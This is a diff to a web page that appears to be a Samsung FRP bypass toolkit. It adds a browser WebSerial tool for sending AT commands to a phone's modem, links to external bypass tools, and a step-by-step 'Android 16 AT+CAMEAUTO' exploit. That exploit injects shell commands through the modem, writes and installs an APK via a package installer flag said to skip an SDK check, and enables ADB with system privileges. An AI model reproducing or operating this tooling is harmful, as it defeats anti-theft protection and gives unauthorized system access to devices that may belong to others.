@@ -537,6 +537,89 @@
     /* ========== HIDE ========== */
     .bar-controls.hidden { display: none; }
     .hidden { display: none; }
+
+    /* ========== WEBSERIAL STYLES ========== */
+    .ws-header {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+    .ws-header h3 { margin: 0; color: var(--text); }
+    .ws-section { margin-bottom: 24px; }
+    .ws-section h3 {
+      font-size: 0.95rem;
+      color: var(--text-dim);
+      margin-bottom: 12px;
+    }
+    .ws-presets {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .ws-btn {
+      padding: 10px 14px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      transition: all 0.2s;
+    }
+    .ws-btn:hover { background: var(--accent); color: #000; border-color: var(--accent); }
+    .ws-btn.ws-warning { background: var(--warning); color: #000; border-color: var(--warning); }
+    .ws-btn-primary {
+      padding: 10px 18px;
+      background: var(--accent);
+      color: #000;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+    .ws-btn-primary:hover { background: var(--accent-dim); }
+    .ws-custom {
+      display: flex;
+      gap: 10px;
+    }
+    .ws-input {
+      flex: 1;
+      padding: 10px 14px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 6px;
+      font-family: monospace;
+      font-size: 0.85rem;
+    }
+    .ws-input:focus { outline: none; border-color: var(--accent); }
+    .ws-log {
+      background: var(--bg-card);
+      padding: 15px;
+      border-radius: 8px;
+      min-height: 180px;
+      max-height: 280px;
+      overflow-y: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 0.8rem;
+      border: 1px solid var(--border);
+    }
+    .ws-log-entry {
+      padding: 4px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .ws-log-entry:last-child { border-bottom: none; }
+    .ws-log-entry.ws-info { color: var(--accent); }
+    .ws-log-entry.ws-sent { color: var(--success); }
+    .ws-log-entry.ws-recv { color: var(--text-dim); }
+    .ws-log-entry.ws-error { color: var(--danger); }
+    @media (max-width: 600px) {
+      .ws-presets { flex-direction: column; }
+      .ws-custom { flex-direction: column; }
+    }
   </style>
 </head>
 <body>
@@ -553,6 +636,7 @@
       <button class="header-tab" id="tab-methods" onclick="switchView('methods')">Methods</button>
       <button class="header-tab" id="tab-adb" onclick="switchView('adb')">ADB</button>
       <button class="header-tab" id="tab-codes" onclick="switchView('codes')">Codes</button>
+      <button class="header-tab" id="tab-serial" onclick="switchView('serial')">WebSerial</button>
     </div>
   </header>
 
@@ -708,6 +792,34 @@
             <div>
               <div class="link-title">ya-webadb GitHub</div>
               <div class="link-url">WebADB library (2,850 stars)</div>
+            </div>
+            <span class="link-arrow">→</span>
+          </a>
+          <a href="https://serial.rf.gd/frp/" target="_blank" class="ext-link">
+            <div>
+              <div class="link-title">NDXCode WebSerial Tool</div>
+              <div class="link-url">Browser-based FRP bypass (WebSerial+WebUSB)</div>
+            </div>
+            <span class="link-arrow">→</span>
+          </a>
+          <a href="https://serial.rf.gd/autofrp/" target="_blank" class="ext-link">
+            <div>
+              <div class="link-title">NDXCode AutoFRP</div>
+              <div class="link-url">Automated browser-based bypass tool</div>
+            </div>
+            <span class="link-arrow">→</span>
+          </a>
+          <a href="https://github.com/NDXCode/Samsung-FRP-Bypass-WEB" target="_blank" class="ext-link">
+            <div>
+              <div class="link-title">Samsung-FRP-Bypass-WEB</div>
+              <div class="link-url">NDXCode GitHub (98 stars)</div>
+            </div>
+            <span class="link-arrow">→</span>
+          </a>
+          <a href="https://github.com/akadriu98/SAM-Android16_FRP" target="_blank" class="ext-link">
+            <div>
+              <div class="link-title">SAM-Android16_FRP</div>
+              <div class="link-url">akadriu98 - Android 16 AT exploit (Python)</div>
             </div>
             <span class="link-arrow">→</span>
           </a>
@@ -1051,6 +1163,67 @@
           </span>
         </div>
         <div class="cat-body" id="codes-info"></div>
+      </div>
+    </div>
+
+    <!-- ========== WEBSERIAL VIEW ========== -->
+    <div id="view-serial" class="view">
+      <div class="tip-box">
+        <div class="tip-title">🔌 WebSerial AT Command Tool</div>
+        <div class="tip-text">
+          Send AT commands directly to your Samsung device via browser.<br>
+          <strong>Requirements:</strong> Enter *#0*# Test Mode first, then connect via USB.<br>
+          <small>Based on NDXCode/Samsung-FRP-Bypass-WEB (98⭐)</small>
+        </div>
+      </div>
+
+      <div class="ws-header">
+        <h3>Connection</h3>
+        <button id="ws-connect" class="ws-btn-primary">🔌 Connect to Device</button>
+        <select id="ws-baud">
+          <option value="115200" selected>115200</option>
+          <option value="9600">9600</option>
+          <option value="57600">57600</option>
+          <option value="115200">115200</option>
+        </select>
+      </div>
+
+      <div class="ws-section">
+        <h3>Preset Commands</h3>
+        <div class="ws-presets">
+          <button class="ws-btn" onclick="wsSend('AT+KSTRINGB=0,3\\r\\n')">Check Mode</button>
+          <button class="ws-btn" onclick="wsSend('AT+DUMPCTRL=1,0\\r\\n')">DUMPCTRL</button>
+          <button class="ws-btn ws-warning" onclick="wsSend('AT+DEBUGLVC=0,5\\r\\n')">DEBUGLVC</button>
+          <button class="ws-btn" onclick="wsSend('AT+SWATD=0\\r\\n')">SWATD Off</button>
+          <button class="ws-btn" onclick="wsSend('AT+ACTIVATE=0,0,0\\r\\n')">ACTIVATE</button>
+          <button class="ws-btn" onclick="wsSend('AT+SWATD=1\\r\\n')">SWATD On</button>
+          <button class="ws-btn" onclick="wsSend('AT+IMEITEST=1,0\\r\\n')">IMEITEST</button>
+        </div>
+      </div>
+
+      <div class="ws-section">
+        <h3>Custom Command</h3>
+        <div class="ws-custom">
+          <input type="text" id="ws-cmd" class="ws-input" placeholder="Enter AT command (e.g., AT+SWATD=1)">
+          <button class="ws-btn-primary" onclick="wsSendCustom()">Send Command</button>
+        </div>
+      </div>
+
+      <div class="ws-section">
+        <h3>Command Log</h3>
+        <div class="ws-log" id="ws-log">
+          <div class="ws-log-entry ws-info">Ready to connect. Make sure device is in *#0*# Test Mode.</div>
+        </div>
+      </div>
+
+      <div class="tip-box">
+        <div class="tip-title">⚠️ Important Notes</div>
+        <div class="tip-text">
+          • <strong>AT+DEBUGLVC</strong> will disconnect the device (USB mode switch). Reconnect after sending.<br>
+          • <strong>Sequence:</strong> SWATD=0 → ACTIVATE → SWATD=1 → IMEITEST → CAMEAUTO<br>
+          • Works best with Samsung USB drivers installed<br>
+          • Use Chrome/Edge (Chromium browsers required)
+        </div>
       </div>
     </div>
 
@@ -1455,6 +1628,26 @@
         steps: `1. WiFi settings
 2. Tap network → Share
 3. Share menu escape?`
+      },
+      {
+        title: "Android 16 AT+CAMEAUTO Exploit",
+        status: "a16",
+        device: "Samsung Android 16",
+        author: "akadriu98",
+        source: "akadriu98/SAM-Android16_FRP",
+        steps: `1. Enter *#0*# Test Mode (connect via USB)
+2. Send: AT+SWATD=0 (Disable ATD)
+3. Send: AT+ACTIVATE=0,0,0 (Activate modem)
+4. Send: AT+SWATD=1 (Enable ATD)
+5. Send: AT+IMEITEST=1,0 (Pre-check)
+6. Send: AT+CAMEAUTO=0,1,0,2,/;$(echo -n <setprop_hex>|xxd -r -p|sh)
+   This injects: setprop persist.sys.usb.config mtp,adb
+7. Deliver base64 APK in 4 chunks to /data/log/adb.txt
+8. Reconstruct: cat /data/log/adb.txt | base64 -d | gzip -dc > /data/log/adb.apk
+9. Install: pm install -i PrePackageInstaller (bypasses SDK check)
+10. Broadcast: am broadcast -a com.android.server.ACTION_USBDEBUG_ENABLED
+Result: System UID, ADB enabled with auto-confirm`,
+        notes: "⚠️ Android 16 ONLY! Advanced exploit using modem shell injection. Requires Python script or WebSerial tool."
       }
     ];
 
@@ -1463,7 +1656,10 @@
       { code: "*#9090#", name: "Service Mode", status: "works", desc: "USB/UART MUX toggle - BYPASSES AUTO BLOCKER!" },
       { code: "*#0808#", name: "USB Settings", status: "blocked", desc: "MTP/ADB/PTP/DM modes - Auto Blocker" },
       { code: "*#0*#", name: "HW Test Mode", status: "blocked", desc: "Hardware diagnostics - Auto Blocker" },
-      { code: "*#7284#", name: "USB I2C", status: "untested", desc: "USB mode control" }
+      { code: "*#7284#", name: "USB I2C", status: "untested", desc: "USB mode control" },
+      { code: "AT+DEBUGLVC=0,5", name: "USB Config Switch", status: "a16", desc: "Changes USB mode - CAUSES DISCONNECT! (Android 16)" },
+      { code: "AT+CAMEAUTO", name: "Shell Injection", status: "a16", desc: "Android 16 exploit - command injection via modem!" },
+      { code: "AT+IMEITEST=1,0", name: "IMEI Test", status: "a16", desc: "Pre-check for Android 16 exploit" }
     ];
 
     const dialCodesDiag = [
@@ -1474,7 +1670,12 @@
       { code: "*#2222#", name: "Service Mode 2", status: "untested", desc: "Network/Modem info" },
       { code: "*#0011#", name: "Service Mode 3", status: "untested", desc: "Network status" },
       { code: "*#872564#", name: "USB Logging", status: "untested", desc: "USB debug logs" },
-      { code: "*#2263#", name: "RF Band", status: "untested", desc: "Network band selection" }
+      { code: "*#2263#", name: "RF Band", status: "untested", desc: "Network band selection" },
+      { code: "AT+KSTRINGB=0,3", name: "Check Mode", status: "at", desc: "Check modem mode status" },
+      { code: "AT+DUMPCTRL=1,0", name: "Dump Control", status: "at", desc: "Enable memory dump" },
+      { code: "AT+SWATD=0", name: "SWATD Off", status: "at", desc: "Disable ATD mode" },
+      { code: "AT+SWATD=1", name: "SWATD On", status: "at", desc: "Enable ATD mode (for ADB)" },
+      { code: "AT+ACTIVATE=0,0,0", name: "Activate", status: "at", desc: "Activate modem functions" }
     ];
 
     const dialCodesInfo = [
@@ -1618,6 +1819,136 @@
         card.style.display = text.includes(search) ? '' : 'none';
       });
     }
+
+    // ============================================
+    // WEBSERIAL FUNCTIONS
+    // ============================================
+    let wsPort = null;
+    let wsWriter = null;
+    let wsReader = null;
+    let wsConnected = false;
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const connectBtn = document.getElementById('ws-connect');
+      if (connectBtn) {
+        connectBtn.addEventListener('click', wsConnect);
+      }
+    });
+
+    async function wsConnect() {
+      const btn = document.getElementById('ws-connect');
+      if (wsConnected) {
+        await wsDisconnect();
+        return;
+      }
+
+      if (!navigator.serial) {
+        wsLog('WebSerial not supported! Use Chrome/Edge.', 'error');
+        return;
+      }
+
+      try {
+        wsPort = await navigator.serial.requestPort();
+        const baud = parseInt(document.getElementById('ws-baud').value);
+        await wsPort.open({ baudRate: baud });
+
+        const textEncoder = new TextEncoderStream();
+        const writableStreamClosed = textEncoder.readable.pipeTo(wsPort.writable);
+        wsWriter = textEncoder.writable.getWriter();
+
+        const textDecoder = new TextDecoderStream();
+        const readableStreamClosed = wsPort.readable.pipeTo(textDecoder.writable);
+        wsReader = textDecoder.readable.getReader();
+
+        wsConnected = true;
+        btn.textContent = '🔌 Disconnect';
+        btn.classList.add('ws-btn-warning');
+
+        wsLog('Connected at ' + baud + ' baud', 'info');
+        wsReadLoop();
+      } catch (err) {
+        wsLog('Connection failed: ' + err.message, 'error');
+      }
+    }
+
+    async function wsDisconnect() {
+      if (wsReader) {
+        try { await wsReader.cancel(); } catch(e) {}
+        wsReader = null;
+      }
+      if (wsWriter) {
+        try { await wsWriter.close(); } catch(e) {}
+        wsWriter = null;
+      }
+      if (wsPort) {
+        try { await wsPort.close(); } catch(e) {}
+        wsPort = null;
+      }
+      wsConnected = false;
+      const btn = document.getElementById('ws-connect');
+      if (btn) {
+        btn.textContent = '🔌 Connect to Device';
+        btn.classList.remove('ws-btn-warning');
+      }
+      wsLog('Disconnected', 'info');
+    }
+
+    async function wsReadLoop() {
+      while (wsConnected && wsReader) {
+        try {
+          const { value, done } = await wsReader.read();
+          if (done) break;
+          if (value) {
+            wsLog(value.trim(), 'recv');
+          }
+        } catch (err) {
+          if (wsConnected) {
+            wsLog('Read error: ' + err.message, 'error');
+          }
+          break;
+        }
+      }
+    }
+
+    async function wsSend(cmd) {
+      if (!wsConnected || !wsWriter) {
+        wsLog('Not connected! Click Connect first.', 'error');
+        return;
+      }
+      try {
+        wsLog('← ' + cmd.trim(), 'sent');
+        await wsWriter.write(cmd);
+        await new Promise(r => setTimeout(r, 500));
+      } catch (err) {
+        wsLog('Send failed: ' + err.message, 'error');
+      }
+    }
+
+    function wsSendCustom() {
+      const input = document.getElementById('ws-cmd');
+      const cmd = input.value.trim();
+      if (!cmd) return;
+      wsSend(cmd + '\r\n');
+      input.value = '';
+    }
+
+    function wsLog(msg, type = 'info') {
+      const logDiv = document.getElementById('ws-log');
+      if (!logDiv) return;
+      const entry = document.createElement('div');
+      entry.className = 'ws-log-entry ws-' + type;
+      const time = new Date().toLocaleTimeString();
+      entry.textContent = '[' + time + '] ' + msg;
+      logDiv.appendChild(entry);
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    // Handle Enter key in custom command input
+    document.addEventListener('keydown', (e) => {
+      if (e.target.id === 'ws-cmd' && e.key === 'Enter') {
+        wsSendCustom();
+      }
+    });
   </script>
 </body>
 </html>
